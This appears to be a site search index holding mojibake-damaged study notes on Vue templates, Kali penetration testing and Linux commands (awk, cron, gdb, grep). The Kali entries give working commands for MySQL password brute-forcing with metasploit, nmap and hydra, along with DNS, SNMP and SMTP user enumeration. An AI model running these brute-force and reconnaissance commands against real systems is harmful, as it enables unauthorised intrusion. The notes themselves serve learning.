ä¹Ÿæœ‰ä¸€äº›å…¶ä»–çš„é’©å­ï¼Œåœ¨å®ä¾‹çš„ç”Ÿå‘½å‘¨æœŸä¸åŒé˜¶æ®µè¢«è°ƒç”¨ï¼Œæ¯”å¦‚ï¼šmountedã€update å’Œ destroyedã€‚ç”Ÿå‘½å‘¨æœŸé’©å­ä¸­çš„ this æŒ‡å‘è°ƒç”¨å®ƒçš„ Vue å®ä¾‹ã€‚\nNoteï¼šä¸è¦åœ¨é€‰é¡¹å±æ€§æˆ–å›è°ƒä¸Šä½¿ç”¨ ç®­å¤´å‡½æ•°ï¼Œæ¯”å¦‚ï¼šcreated: () =\u0026gt; console.log(this.a) æˆ– vm.$watch('a', newValue =\u0026gt; this.myMethod())ã€‚å› ä¸ºç®­å¤´å‡½æ•°æ˜¯å’Œçˆ¶çº§ä¸Šä¸‹æ–‡ç»‘å®šåœ¨ä¸€èµ·çš„ã€‚\nç”Ÿå‘½å‘¨æœŸå›¾ç¤º #  æ¨¡æ¿è¯­æ³• #  æ’å€¼ #  æ•°æ®ç»‘å®šæœ€å¸¸è§çš„å½¢å¼å°±æ˜¯ä½¿ç”¨ â€œMustacheâ€ è¯­æ³• (åŒå¤§æ‹¬å·) çš„æ–‡æœ¬æ’å€¼ï¼š\n\u0026lt;span\u0026gt;Message: {{ msg }}\u0026lt;/span\u0026gt; é€šè¿‡ä½¿ç”¨ v-once æŒ‡ä»¤ï¼Œä½ ä¹Ÿèƒ½æ‰§è¡Œä¸€æ¬¡æ€§åœ°æ’å€¼ï¼Œå½“æ•°æ®æ”¹å˜æ—¶ï¼Œæ’å€¼å¤„çš„å†…å®¹ä¸ä¼šæ›´æ–°ã€‚ä½†è¯·ç•™å¿ƒè¿™ä¼šå½±å“åˆ°è¯¥èŠ‚ç‚¹ä¸Šçš„å…¶å®ƒæ•°æ®ç»‘å®šï¼š\n\u0026lt;span v-once\u0026gt;è¿™ä¸ªå°†ä¸ä¼šæ”¹å˜: {{ msg }}\u0026lt;/span\u0026gt; åŒå¤§æ‹¬å·ä¼šå°†æ•°æ®è§£é‡Šä¸ºæ™®é€šæ–‡æœ¬ï¼Œè€Œé HTML ä»£ç ã€‚ä¸ºäº†è¾“å‡ºçœŸæ­£çš„ HTMLï¼Œä½ éœ€è¦ä½¿ç”¨ v-html æŒ‡ä»¤ï¼š\n\u0026lt;script src=\u0026#34;https://unpkg.com/vue\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;  \u0026lt;div id=\u0026#34;app-9\u0026#34;\u0026gt;  \u0026lt;p\u0026gt;{{ RawHtml }}\u0026lt;/p\u0026gt;  \u0026lt;p\u0026gt;\u0026lt;span v-html=\u0026#34;RawHtml\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; var obj = { RawHtml: \u0026#34;\u0026lt;span style=\u0026#39;color:red\u0026#39;\u0026gt;This should be red\u0026lt;/span\u0026gt;\u0026#34; }  var app8 = new Vue({ \tel: \u0026#34;#app-9\u0026#34;,  data: obj, }) Noteï¼šæ³¨æ„åªå¯¹å¯ä¿¡å†…å®¹ä½¿ç”¨ HTML æ’å€¼ï¼Œç»å¯¹ä¸è¦ä½¿ç”¨ç”¨æˆ·æä¾›çš„å†…å®¹ä½¿ç”¨æ’å€¼ï¼Œå› ä¸ºå®ƒå¾ˆå®¹æ˜“å¯¼è‡´ XSSã€‚\nMustache è¯­æ³•ä¸èƒ½ä½œç”¨åœ¨ HTML ç‰¹æ€§ä¸Šï¼Œé‡åˆ°è¿™ç§æƒ…å†µåº”è¯¥ä½¿ç”¨ v-bind æŒ‡ä»¤ï¼š\n\u0026lt;div v-bind:id=\u0026#34;dynamicId\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; å¯¹äºæ‰€æœ‰çš„æ•°æ®ç»‘å®šï¼ŒVue.js éƒ½æä¾›äº†å®Œå…¨çš„ JavaScript è¡¨è¾¾å¼æ”¯æŒã€‚ä¸è¿‡æ¯ä¸ªç»‘å®šåªèƒ½åŒ…å«å•ä¸ªè¡¨è¾¾å¼ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›ä¾‹å­ï¼š\n{{ number + 1 }} \u0026lt;!--ç”Ÿæ•ˆ--\u0026gt;  {{ ok ? \u0026#39;YES\u0026#39; : \u0026#39;NO\u0026#39; }} \u0026lt;!--ç”Ÿæ•ˆ--\u0026gt;  {{ var a = 1 }} \u0026lt;!--æ— æ•ˆï¼šè¿™æ˜¯è¯­å¥ï¼Œä¸æ˜¯è¡¨è¾¾å¼--\u0026gt; PostScriptï¼šæ¨¡æ¿è¡¨è¾¾å¼éƒ½è¢«æ”¾åœ¨æ²™ç›’ä¸­ï¼Œåªèƒ½è®¿é—®å…¨å±€å˜é‡çš„ä¸€ä¸ªç™½åå•ï¼Œå¦‚ Math å’Œ Date ã€‚ä½ ä¸åº”è¯¥åœ¨æ¨¡æ¿è¡¨è¾¾å¼ä¸­è¯•å›¾è®¿é—®ç”¨æˆ·å®šä¹‰çš„å…¨å±€å˜é‡ã€‚\næŒ‡ä»¤ #  æŒ‡ä»¤ (Directives)ï¼šæ˜¯å¸¦æœ‰ v- å‰ç¼€çš„ç‰¹æ®Šç‰¹æ€§ã€‚æŒ‡ä»¤ç‰¹æ€§çš„å€¼é¢„æœŸæ˜¯å•ä¸ª JavaScript è¡¨è¾¾å¼ã€‚æŒ‡ä»¤çš„èŒè´£æ˜¯ï¼Œå½“è¡¨è¾¾å¼çš„å€¼æ”¹å˜æ—¶ï¼Œå°†å…¶äº§ç”Ÿçš„è¿å¸¦å½±å“ï¼Œå“åº”å¼åœ°ä½œç”¨äº DOMã€‚\nä¸€äº›æŒ‡ä»¤èƒ½å¤Ÿæ¥æ”¶ä¸€ä¸ªâ€œå‚æ•°â€ï¼Œåœ¨æŒ‡ä»¤åç§°ä¹‹åä»¥å†’å·è¡¨ç¤ºã€‚ä¾‹å¦‚ï¼Œv-bind æŒ‡ä»¤å¯ä»¥ç”¨äºå“åº”å¼åœ°æ›´æ–° HTML ç‰¹æ€§ï¼š\n\u0026lt;a v-bind:href=\u0026#34;url\u0026#34;\u0026gt;...\u0026lt;/a\u0026gt; "},{"id":101,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/kali/mysql%E7%88%86%E7%A0%B4/","title":"Mysqlçˆ†ç ´","section":"Kali","content":" â€‹\tå­¦ä¹ åœ°å€ï¼š\n https://xz.aliyun.com/t/1652   MYSQL çˆ†ç ´ #  ä½¿ç”¨ metasploit #  å¯åŠ¨ metasploitï¼š\n$ msfconsole ä½¿ç”¨ auxiliary/scanner/mysql/mysql_login æ¨¡å—è¿›è¡Œï¼š\nå¯ä»¥å•ä¸€æ‰«æéªŒè¯ç™»å½•éªŒè¯ï¼š\nuse auxiliary/scanner/mysql/mysql_login set rhosts \u0026lt;ip-address\u0026gt; set username root set password 11111111 run ä½¿ç”¨æŸä¸ªå­—å…¸è¿›è¡Œçˆ†ç ´ï¼š\nuse auxiliary/scanner/mysql/mysql_login set RHOSTS \u0026lt;ip-address\u0026gt; set pass_file â€œ/root/top10000pwd.txtâ€ set username root run nmap æ‰«æ #  å¯ä»¥æŸ¥çœ‹æ‰€æœ‰ä¸ mysql ç›¸å…³çš„è„šæœ¬ï¼š\n$ ls -al /usr/share/nmap/scripts/mysql* å…ˆæŸ¥çœ‹æ˜¯å¦å¼€å¯äº†ç«¯å£\n$ nmap \u0026lt;ip-address\u0026gt; æ‰«æç©ºå£ä»¤ï¼š\n$ nmap -p3306 --script=mysql-empty-password.nse 192.168.137.130 æ‰«æå·²çŸ¥å£ä»¤ï¼š\n$ nmap -sV --script=mysql-databases --script-args dbuser=root,dbpass=11111111 192.168.195.130 xHydra å’Œ Hydras #  ä½¿ç”¨å­—å…¸è¿›è¡Œçˆ†ç ´ï¼š\n$ hydra -l root -P /root/Desktop/top10000pwd.txt -t 16 192.168.157.130 mysql "},{"id":102,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/kali/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","title":"ä¿¡æ¯æ”¶é›†","section":"Kali","content":" å­¦ä¹ é€”å¾„ï¼š\n https://bbs.pediy.com/thread-215178.htm   ä¿¡æ¯æ”¶é›† #   åˆ°æœ€åè¿˜æ˜¯ nmap æœ€å¥½ç”¨ã€‚\n DNS åŸŸåè§£æ #  è§£æä¸€ä¸ªåŸŸåçš„ IP åœ°å€ï¼š\n$ host www.example.com æˆ–è€…ä½¿ç”¨ä»¥ä¸‹çš„æ–¹å¼è¯¦ç»†åˆ—ä¸¾åŒ…æ‹¬ DNS æœåŠ¡å™¨çš„ä¿¡æ¯ï¼š\n$ nslookup www.example.com ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ—ä¸¾ DNS è¯·æ±‚çš„è¯¦ç»†ä¿¡æ¯ï¼š\n$ dig www.example.com æšä¸¾å­åŸŸåï¼š\n$ dnsmap example.com æœåŠ¡æšä¸¾ #  æˆ‘ä»¬å°†è¦ç ”ç©¶ DNS æšä¸¾å’Œ SNMP æšä¸¾æŠ€æœ¯ã€‚\nDNS æšä¸¾ #  DNS æšä¸¾æ˜¯å®šä½æŸä¸ªç»„ç»‡çš„æ‰€æœ‰ DNS æœåŠ¡å™¨å’Œ DNS æ¡ç›®çš„è¿‡ç¨‹ã€‚DNS æšä¸¾å…è®¸æˆ‘ä»¬æ”¶é›†æœ‰å…³è¯¥ç»„ç»‡çš„é‡è¦ä¿¡æ¯ï¼Œä¾‹å¦‚ç”¨æˆ·åã€è®¡ç®—æœºåç§°ã€IP åœ°å€ä»¥åŠå…¶å®ƒã€‚ä¸ºäº†å®Œæˆè¿™äº›ä»»åŠ¡æˆ‘ä»¬ä¼šä½¿ç”¨ DNSenumã€‚\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„å‘½ä»¤è¿›è¡Œ DNS æšä¸¾ï¼š\n$ dnsenum --enum \u0026lt;domain-name\u0026gt; æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€äº›é¢å¤–çš„é€‰é¡¹æ¥è¿è¡Œ DNSenumï¼Œå®ƒä»¬åŒ…æ‹¬è¿™äº›ä¸œè¥¿ï¼š\n --threads [number] å…è®¸ä½ è®¾ç½®ä¸€æ¬¡æ‰€è¿è¡Œçš„çº¿ç¨‹æ•°é‡ã€‚ -r å…è®¸ä½ å¼€å¯é€’å½’æŸ¥æ‰¾ã€‚ -d å…è®¸ä½ è®¾ç½®åœ¨ WHOIS è¯·æ±‚ä¹‹é—´çš„æ—¶é—´å»¶è¿Ÿï¼Œå•ä½ä¸ºç§’ã€‚ -o å…è®¸æˆ‘ä»¬åˆ¶å®šè¾“å‡ºä½ç½®ã€‚ -w å…è®¸æˆ‘ä»¬å¼€å¯ WHOIS æŸ¥è¯¢ã€‚  è¿˜å¯ä»¥ä½¿ç”¨ fierce ï¼ˆä¸€ä¸ªå°è¯•å¤šç§æŠ€æœ¯æ¥å¯»æ‰¾æ‰€æœ‰ç›®æ ‡æ‰€ç”¨çš„ IP åœ°å€å’ŒåŸŸåçš„å·¥å…·ï¼‰è¿›è¡ŒåŸŸåæ‰«æï¼š\n$ fierce -dns \u0026lt;domain-adddress\u0026gt; ä¸ºäº†ä»¥æŒ‡å®šçš„è¯è¯­åˆ—è¡¨è¿›è¡Œç›¸åŒçš„æ“ä½œï¼Œé”®å…¥ä»¥ä¸‹å‘½ä»¤ï¼š\n$ fierce -dns \u0026lt;domain-address\u0026gt; -wordlist hosts.txt -file /tmp/output.txt SNMP æšä¸¾ #  å¯¹äº SNMP æšä¸¾ï¼Œæˆ‘ä»¬ä¼šä½¿ç”¨å«åš SnmpEnum çš„å·¥å…·ï¼Œå®ƒæ˜¯ä¸€ä¸ªå¼ºå¤§çš„ SNMP æšä¸¾å·¥å…·ï¼Œå…è®¸æˆ‘ä»¬åˆ†æç½‘ç»œä¸Šçš„ SNMP æµé‡ã€‚\nSnmpwalk æ˜¯ä¸€ä¸ªä½¿ç”¨ SNMP GETNEXT è¯·æ±‚åœ¨ç½‘ç»œå®ä½“ä¸­æŸ¥è¯¢ä¿¡æ¯æ ‘çš„ SNMP åº”ç”¨ã€‚åœ¨å‘½ä»¤è¡Œä¸­é”®å…¥ä¸‹åˆ—å‘½ä»¤ï¼š\n$ snmpwalk -c public \u0026lt;ip-address\u0026gt; -v 2c æˆ‘ä»¬äº¦å¯ä»¥æšä¸¾å®‰è£…çš„è½¯ä»¶ï¼š\n$ snmpwalk -c public \u0026lt;ip-address\u0026gt; -v 1 | grep hrSWInstalledName æˆ–è€…æšä¸¾å¼€æ”¾çš„ TCP ç«¯å£ï¼š\n$ snmpwalk -c public 192.168.10.200 -v 1 | grep tcpConnState | cut -d\u0026#34;.\u0026#34; -f6 | sort â€“nu å¦ä¸€ä¸ªé€šè¿‡ SNMP æ”¶é›†ä¿¡æ¯çš„å·¥å…·å«åš snmpcheckï¼š\n$ snmpcheck -t \u0026lt;ip-address\u0026gt; SMTP ç”¨æˆ·æšä¸¾ #  å¯ä»¥åœ¨ SMTP æœåŠ¡å™¨ä¸Šå¯åŠ¨ç”¨æˆ·çš„ SMTP æšä¸¾ï¼š\n$ smtp-user-enum -M VRFY -U /tmp/users.txt -t \u0026lt;address\u0026gt; ç½‘ç»œèŒƒå›´ #  $ dmitry -wnspb targethost.com -o /root/Desktop/dmitry-result é”®å…¥ä»¥ä¸‹å‘½ä»¤æ¥æ‰§è¡Œ ICMP netmask è¯·æ±‚ï¼š\n$ netmask -s targethost.com ä½¿ç”¨ scapyï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œå¹¶è¡Œè·¯ç”±è·Ÿè¸ªã€‚é”®å…¥ä»¥ä¸‹å‘½ä»¤æ¥å¯åŠ¨å®ƒï¼š\n$ scapy ç°åœ¨å¯ä»¥è¾“å…¥ä»¥ä¸‹å‡½æ•°ï¼š\nans,unans=sr(IP(dst=\u0026#34;www.targethost.com/30\u0026#34;, ttl=(1,6))/TCP() å¯ä»¥è¾“å…¥ä»¥ä¸‹å‡½æ•°æ¥å°†ç»“æœå±•ç¤ºä¸ºè¡¨æ ¼ï¼š\nans.make_table( lambda (s,r): (s.dst, s.ttl, r.src) ) IP åæŸ¥ #  $ nmap --script hostmap-ip2hosts \u0026lt;ip-address\u0026gt; æˆ–ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åæŸ¥æŸä¸ªç«¯å£ä¸Šçš„ IP åœ°å€ï¼š\n$ nmap --script hostmap-ip2hosts \u0026lt;ip-address\u0026gt; -p\u0026lt;port\u0026gt; WAF æ£€æµ‹ #  $ wafw00f \u0026lt;target-address\u0026gt; "},{"id":103,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/kali/%E6%BC%8F%E6%B4%9E%E8%AF%84%E4%BC%B0/","title":"æ¼æ´è¯„ä¼°","section":"Kali","content":"æ¼æ´è¯„ä¼° #  Nessus #  ä½¿ç”¨ Nessus è¿™ä¸ªå·¥å…·ï¼Œä½¿ç”¨æ•™ç¨‹ï¼šhttps://cloud.tencent.com/developer/article/1076409\nå‘ç°æœ¬åœ°æ¼æ´ #  å‘ç°ç½‘ç»œæ¼æ´ #   åœ¨ Policies â†’ Add â†’ Web Application ä¸­é€‰æ‹© Web Application Tests æ–°å»ºä¸€ä¸ªè‡ªå·±çš„ Policiesã€‚ åœ¨ My Scan â†’ New Scan ä¸­é€šè¿‡ä¹‹å‰å®šä¹‰çš„ Policies å®šä¹‰ä¸€ä¸ªæ–°çš„ Scan åœ¨ My Scan ç•Œé¢å¯åŠ¨æ–°çš„ Scan  OpenVAS #  OpenVASï¼Œå³å¼€æ”¾æ¼æ´è¯„ä¼°ç³»ç»Ÿï¼Œæ˜¯ä¸€ä¸ªç”¨äºè¯„ä¼°ç›®æ ‡æ¼æ´çš„æ°å‡ºæ¡†æ¶ã€‚å®ƒæ˜¯ Nessus é¡¹ç›®çš„åˆ†æ”¯ã€‚ä¸åƒ Nessusï¼ŒOpenVASæä¾›äº†å®Œå…¨å…è´¹çš„ç‰ˆæœ¬ã€‚ç”±äº OpenVAS åœ¨Kali Linuxä¸­æˆä¸ºæ ‡å‡†ï¼Œæˆ‘ä»¬å°†ä¼šä»¥é…ç½®å¼€å§‹ã€‚\n"},{"id":104,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/awk/","title":"Awk","section":"Linux-Command","content":"Awk #  Brief Introduction #   å­¦ä¹ ç½‘å€ï¼šhttps://www.tecmint.com/use-linux-awk-command-to-filter-text-string-in-files/\n The general syntax of awk is:\n$ awk \u0026#39;script\u0026#39; filename # \u0026#39;script\u0026#39; format =\u0026gt; \u0026#39;/pattern/ action\u0026#39; Where 'script' is a set of commands that are understood by awk and execute on file, filename.\nIt works by reading a given line in the file, makes a copy of the line and then executes the script on the line. This is repeated on all the lines in the file.\nThe 'script' is in the form '/pattern/ action' where pattern is a regular expression and the action is what awk will do when it finds the given pattern in a line.\nThe GNU Awk User\u0026rsquo;s Guide #   å­¦ä¹ ç½‘å€ï¼šhttps://www.gnu.org/software/gawk/manual/gawk.html#Getting-Started\n awk is an interpreted language which means awk utility reads your program and then processes your data according to the instructions in your program. awk programs are data driven while most other languages are procedural.\nWhen you run awk, you specify an awk program that tells awk what to do. The program consists of a series of rules. Each rule specifies one pattern to search for and one action to perform upon finding the pattern.\nAn awk program looks like this:\npattern {action} pattern {action} 1. Run awk programs #  If the program is short, it is easiest to include it in the command that runs awk:\n$ awk \u0026#39;program\u0026#39; input-file1 input-file2 otehrwise:\n$ awk -f program-file input-file1 input-file2 1.1 Running #  Running without input files\n$ awk \u0026#39;program\u0026#39; awk applies the program to the standard input, which usually means whatever you type on the keyboard. This continues until you indicate end-of-file by typing Ctrl-d. (On non-POSIX operating systems, the end-of-file character may be different.)\nExecutable awk program\n#!/bin/awk -f  BEGIN {print \u0026#34;Don\u0026#39;t Panic!\u0026#34;} 1.2 Example programs #  This is a typical task that awk programs do.\n$ ls -l | awk \u0026#39;$6 == \u0026#34;Nov\u0026#34;{ sum += $5 } \u0026gt;\tEND {print sum}\u0026#39;   The awk utility reads the input files one line at a time. For each line, awk tries the patterns of each rule. If several patterns match, then several actions execute in the order in which they appear in the awk program. If no patterns match, then no actions run.\n  This command prints the total number of bytes in all the files in the current directory that were last modified in November (of any year).\n  When awk statements within one rule are short, you might want to put more than one of them on a line. This is accomplished by separating the statements with a semicolon (â€˜;â€™). This also applies to the rules themselves. Thus, the program shown at the start of this section could also be written this way:\n$ ls -l | awk \u0026#39;$6 == \u0026#34;Nov\u0026#34;{ sum += $5 }; END {print sum}\u0026#39;   Print every line that has at least one field:\n$ awk \u0026#39;NF\u0026gt;0\u0026#39; data  default action is {print $0} NF stand for the fields amout in one line  Count line in a file:\n$ awk \u0026#39;END {print NR}\u0026#39; data 2. Running awk and gawk #  3. Regex Expression #  4. Reading Input Files #  The input is read in units called records, and is processed by the rules of your program one record at a time. By default, each record is one line. Each record is automatically split into chunks called fields. This makes it more convenient for programs to work on the parts of a record.\nRecord Split #  Record splitting with standard awk.\nRecords are separated by a character called the record separator. By default, the record separator is the newline character. This is why records are, by default, single lines. To use a different character for the record separator, simply assign that character to the predefined variable RS. For example:\n$ awk \u0026#39;BEGIN {RS=\u0026#39;u\u0026#39;}; {print $0}\u0026#39; data Another way to change to record separator is on the command line, using the variable-assignment feature:\n$ awk \u0026#39;{print $0}\u0026#39; RS=\u0026#34;u\u0026#34; data "},{"id":105,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/command/","title":"Command","section":"Linux-Command","content":"Question: How to check if a program exists from a Bash script?\nAnswer: three possible method:\n  POSIX compatible:\n$ command -v \u0026lt;the_command\u0026gt;   For bash specific environments:\n$ hash \u0026lt;the_command\u0026gt; # For regular commands. Or... $ type \u0026lt;the_command\u0026gt; # To check built-ins and keywords   Many operating systems have a which that doesn\u0026rsquo;t even set an exit status, meaning the if which foo won\u0026rsquo;t even work there and will always report that foo exists, even if it doesn\u0026rsquo;t (note that some POSIX shells appear to do this for hash too).\nSo, don\u0026rsquo;t use which. Instead use one of these:\n$ command -v foo \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 || { echo \u0026gt;\u0026amp;2 \u0026#34;I require foo but it\u0026#39;s not installed. Aborting.\u0026#34;; exit 1; }  $ type foo \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 || { echo \u0026gt;\u0026amp;2 \u0026#34;I require foo but it\u0026#39;s not installed. Aborting.\u0026#34;; exit 1; }  $ hash foo 2\u0026gt;/dev/null || { echo \u0026gt;\u0026amp;2 \u0026#34;I require foo but it\u0026#39;s not installed. Aborting.\u0026#34;; exit 1; } "},{"id":106,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/crontab/","title":"Crontab","section":"Linux-Command","content":" å­¦ä¹ ç½‘å€ï¼š\n https://www.marksanborn.net/linux/learning-cron-by-example/ http://www.unixgeeks.org/security/newbie/unix/cron-1.html   CRON #  If you are using a Linux system and want to schedule a task to run in the future you will probably need to know cron. Cron is much like Windowâ€™s Scheduled Tasks. The only difference is that cron is conifgured by a simple text file.\nNow obviously cron is very dependent and sensitive to the time. If you want accurate results from cron you are going to want to setup your computer to sync its clock via NTP.\n$ sudo ntpdate pool.ntp.org Editing Cron #  There are more than one way to edit the cron config files; however many of them require you to restart the service.\nHere is a method to add a task to cron without having to restart the deamon:\n$ crontab -e Here is the basic structure for cron:\nm h dom mon dow command where\n m - minutes h - hours (24 hours) dom - day of month mon - month dow - day of the week command - the command you want to run. This can contain spaces or point to a bash script.  Examples #  *â€™s represent wildcards or any:\n10 * * * * echo â€œThis command is run at 10 min past every hourâ€\r22 7 * * * echo â€œThis command is run daily at 7:22 amâ€\r00 4 * * 0 echo â€œThis command is run at 4 am every Sundayâ€ PostScript: In dow, 0 and 7 are both represent Sunday.\nUsing the - allows us to specify ranges of days (Execute at 5 pm only in weekdays):\n* 17 * * 1-5 /path/to/your/code Using the , allows us to specify intervals without having to have multiple entries in cron: (This would execute the ask on the 1st, the 10th, the 20th and on the 30th of each month, at 17:59 PM.)\n59 17 1,10,20,30 * * /home/username/backupsite Using the / allows us to divide the day into chunks: (Here, the tasks is executed every 4 hours (24â„6 =4).)\n59 */6 * * * /home/username/backupsite Start #  Cron is a daemon, which means that it only needs to be started once, and will lay dormant until it is required.\nThe cron daemon, or crond, stays dormant until a time specified in one of the config files, or crontabs.\n"},{"id":107,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/du/","title":"Du","section":"Linux-Command","content":"du #  ç”¨äºè®¡ç®—æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹å¤§å°çš„å‘½ä»¤ï¼Œè‹¥è¦è®¡ç®—ä¸€ä¸ªæ–‡ä»¶å¤¹çš„å¤§å°ï¼š\n$ du -h \u0026lt;your-folder\u0026gt; è‹¥è¦åªæ˜¾ç¤ºä¸€ä¸ªæ–‡ä»¶å¤¹å¤§å°çš„æ€»å’Œï¼š\n$ du -hcs \u0026lt;your-folder\u0026gt; "},{"id":108,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/fold/","title":"Fold","section":"Linux-Command","content":"Fold #  fold:\n  manual:\n Usage: fold [OPTION]\u0026hellip; [FILE]\u0026hellip; Wrap input lines in each FILE, writing to standard output.\n   example:\n$ echo \u0026#34;Hello\u0026#34; \u0026gt; t1  $ echo \u0026#34;World\u0026#34; \u0026gt; t2  $ fold t1 t2 Hello World   "},{"id":109,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/gdb/","title":"Gdb","section":"Linux-Command","content":"gdb #  Quick Manual #  å¸¸ç”¨å‘½ä»¤:\n  åˆ—å‡ºç¨‹åºä¸­çš„æ‰€æœ‰å˜é‡åï¼ˆgdbï¼‰ï¼š\n(gdb) info variables   åˆ—å‡ºç¨‹åºä¸­çš„æ‰€æœ‰å‡½æ•°åï¼ˆgdbï¼‰ï¼š\n(gdb) info functions   åˆ—å‡ºä¸€ä¸ªå‡½æ•°çš„æ±‡ç¼–ä»£ç ï¼ˆgdbï¼‰ï¼š\n(gdb) disas main   æŸ¥çœ‹æŒ‡å®šåœ°å€å†…çš„å­—ç¬¦ä¸²ï¼ˆgdbï¼‰ï¼š\n(gdb) x /s \u0026lt;memory_address\u0026gt;   æŸ¥çœ‹å„ä¸ªç¨‹åºæ®µçš„è¯»å†™æ‰§è¡Œæƒé™ï¼ˆgdbï¼šgef æ’ä»¶æˆ– peda æ’ä»¶éƒ½æ”¯æŒï¼‰\n(gdb-peda) vmmap   æŸ¥çœ‹å †çš„ä¿¡æ¯ä»¥åŠæŒ‰ç»“æ„è§£æå †ï¼š\n(gdb-peda) heapinfo (gdb-peda) parseheap   PEDA #  æ’ä»¶ PEDAï¼ˆPython Exploit Development Assistance for GDBï¼‰\nä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å®‰è£…ï¼š\n$ git clone https://github.com/longld/peda  $ echo \u0026#34;souce `pwd`/peda/peda.py\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit è¿™ä¸ªæ’ä»¶å°†ä¼šåœ¨å¼€å¯ gdb ä¹‹åæ³¨å…¥ä¸€äº›å‘½ä»¤ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨å‘½ä»¤ï¼š\n   å‘½ä»¤ åŠŸèƒ½     aslr æ£€æµ‹ç¨‹åºåœ°å€éšæœºåŒ–æ˜¯å¦å¼€å¯/è®¾ç½®åœ°å€éšæœºåŒ–   checksec æ£€æµ‹ç¨‹åºå¼€å¯çš„å®‰å…¨ä¿æŠ¤   dumpargs æ˜¾ç¤ºæ‰§è¡Œç¨‹åºæ˜¯çš„å‘½ä»¤è¡Œå‚æ•°   elfheader/readelf æ£€æµ‹ ELF æ–‡ä»¶çš„æ–‡ä»¶å¤´ä¿¡æ¯   elfsymbol æ˜¾ç¤ºæ–‡ä»¶ä¸­åŒ…å«çš„æ‰€æœ‰éè°ƒå¼ä¿¡æ¯   lookup æŸ¥æ‰¾ä¸€ä¸ªç»™å®šåœ°å€èŒƒå›´å†…ä¸­ï¼Œæ‰€æœ‰è¢«å¼•ç”¨çš„ä¿¡æ¯   patch åœ¨ä¸€æ®µåœ°å€ä¹‹å‰é€šè¿‡ å­—ç¬¦ä¸²/åå…­è¿›åˆ¶/æ•´æ•° çš„æ–¹å¼ï¼Œæ·»åŠ ä¸€æ®µæ•°æ®   pattern åœ¨å†…å­˜ä¸­ï¼Œç”Ÿæˆ/æŸ¥æ‰¾/å†™å…¥ ä¸€ä¸ªå¾ªç¯æ¨¡å¼   procinfo æ˜¾ç¤ºä» /proc/pid ä¸­å¾—åˆ°çš„ä¿¡æ¯   pshow/pset æ˜¾ç¤º/è®¾ç½® peda çš„å±æ€§å‚æ•°   ropgadget/ropsearch æ˜¾ç¤ºæ‰€æœ‰çš„ ROP é“¾/æŸ¥æ‰¾ç»™å®šçš„ ROP é“¾   searchmem/find åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼ŒæŸ¥æ‰¾ä¸€ä¸ªæŒ‡å®šçš„æ­£åˆ™è¡¨è¾¾å¼   shellcode ç”Ÿæˆæˆ–ä¸‹è½½å¸¸ç”¨çš„ shellcode   xormem å¯¹ä¸€æ®µç»™å®šçš„åœ°å€èŒƒå›´è¿›è¡Œå¼‚æˆ–æ“ä½œ    "},{"id":110,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/grep/","title":"Grep","section":"Linux-Command","content":"grep #  Example #   https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux\n Find all files containing specific text:\n$ grep -rnw \u0026#39;/path/to/somewhere/\u0026#39; -e \u0026#39;pattern\u0026#39;  -r or -R is recursive, -n is line number, and -w stands for match the whole word. -l (lower-case L) can be added to just give the file name of matching files.  Along with these, --exclude, --include, --exclude-dir flags could be used for efficient searching:\n  This will only search through those files which have .c or .h extensions:\n$ grep --include=\\*.{c,h} -rnw \u0026#39;/path/to/somewhere/\u0026#39; -e \u0026#34;pattern\u0026#34;   This will exclude searching all the files ending with .o extension:\n$ grep --exclude=*.o -rnw \u0026#39;/path/to/somewhere/\u0026#39; -e \u0026#34;pattern\u0026#34;   For directories it\u0026rsquo;s possible to exclude a particular directory(ies) through --exclude-dir parameter. For example, this will exclude the dirs dir1/, dir2/ and all of them matching *.dst/:\n$ grep --exclude-dir={dir1,dir2,*.dst} -rnw \u0026#39;/path/to/somewhere/\u0026#39; -e \u0026#34;pattern\u0026#34;   "},{"id":111,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/iptables/","title":"Iptables","section":"Linux-Command","content":" å­¦ä¹ ç½‘å€ï¼š\n https://www.jianshu.com/p/c2aee2ff7bd8 https://www.jianshu.com/p/62028875d53e  ä¸€ä¸ªå…³äºè½¬å‘çš„æ•™ç¨‹ï¼š\n https://www.91yun.co/archives/3042   iptables 